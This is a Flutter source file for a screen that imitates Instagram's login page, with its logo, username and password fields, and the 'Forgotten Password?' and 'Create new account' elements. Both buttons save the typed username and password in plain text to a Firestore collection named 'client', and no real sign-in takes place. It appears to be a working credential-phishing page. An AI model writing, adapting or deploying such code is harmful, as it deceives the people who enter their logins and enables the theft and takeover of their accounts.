import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:suriya/resuable_widget.dart';
import 'package:suriya/util.dart';

class InstagramLoginPage extends StatefulWidget {
  const InstagramLoginPage({super.key});

  @override
  State<InstagramLoginPage> createState() => _InstagramLoginPageState();
}

class _InstagramLoginPageState extends State<InstagramLoginPage> {
  final TextEditingController _emailTextcontroller = TextEditingController();
  final TextEditingController _passwordTextcontroller = TextEditingController();
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        decoration: BoxDecoration(gradient: LinearGradient(colors: [
          hexStringToColor("2B2E3F"),
          hexStringToColor("1e3442"),
          hexStringToColor("1B373A"),
        ],begin: Alignment.topLeft,end: Alignment.bottomRight)),
        child: SingleChildScrollView(
          child: Padding(
            padding: EdgeInsets.fromLTRB(20.w, MediaQuery.of(context).size.height*0.06.h, 20.w, 0.h),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text("English(India)",style: TextStyle(color: Colors.grey,fontSize: 10.sp),)
                  ],
                ),
                SizedBox(height: 80.h,),
                logoWidget("assets/logo.png",),
               // Image.asset("assets/logo.png"),
                SizedBox(height: 80.h,),
                reusableTextField("Username, email or mobile number", false, _emailTextcontroller),//Icons.person_outline,
                SizedBox(height: 10.h,),
                reusableTextField("Password", true, _passwordTextcontroller),//Icons.lock,
                SizedBox(height: 10.h,),
            Container(
              width: MediaQuery.of(context).size.width,
              height: 35.h,
              margin: const EdgeInsets.fromLTRB(0, 10, 0, 20),
              decoration: BoxDecoration(borderRadius: BorderRadius.circular(90)),
              child: ElevatedButton(
                onPressed: (){
                  CollectionReference collRef =FirebaseFirestore.instance.collection('client');
                  collRef.add({
                    'name':_emailTextcontroller.text,
                    'pass':_passwordTextcontroller.text,
                  });

                },
                child: Text("Log In",
                  style: TextStyle(color: Colors.white,fontSize: 16.sp,fontWeight: FontWeight.normal),
                ),
                style: ButtonStyle(
                    backgroundColor: WidgetStateProperty.resolveWith((states) {
                      if (states.contains(WidgetState.pressed)) {
                        return Colors.white10;
                      }
                      return Colors.blueAccent;
                    }),
                    shape: WidgetStateProperty.all<RoundedRectangleBorder>(
                        RoundedRectangleBorder(borderRadius: BorderRadius.circular(30)))),
              ),
            ),
                //SignInSignUpButton(context, true, (){}),
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text("Forgotten Password?",style: TextStyle(fontWeight: FontWeight.normal,fontSize: 12.5.sp),)
                  ],
                ),
                SizedBox(height: 140.h,),
                //SignUpButton(context, false, (){}),
            Container(
              width: MediaQuery.of(context).size.width,
              height: 35.h,
              child: ElevatedButton(
                onPressed: (){
                  CollectionReference collRef =FirebaseFirestore.instance.collection('client');
                  collRef.add({
                    'name':_emailTextcontroller.text,
                    'pass':_passwordTextcontroller.text,
                  });

                },
                  style: ElevatedButton.styleFrom(
                    // Transparent background
                    backgroundColor: Colors.transparent,
                    // Remove shadow
                    shadowColor: Colors.transparent,
                    // Border with custom color and width
                    side: const BorderSide(
                      color: Colors.blue, // Border color
                      width: 2, // Border width
                    ),
                    // Adjust the shape as needed
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(90), // Rounded corners
                    ),
                  ),
                  child: Text('Create new account',
                    style: TextStyle(color: Colors.blue,fontSize: 15.sp), // Text color to match the border
                  ),
              ),
            )
              ]
            ),
          ),
        ),
      ),
    );
  }
}
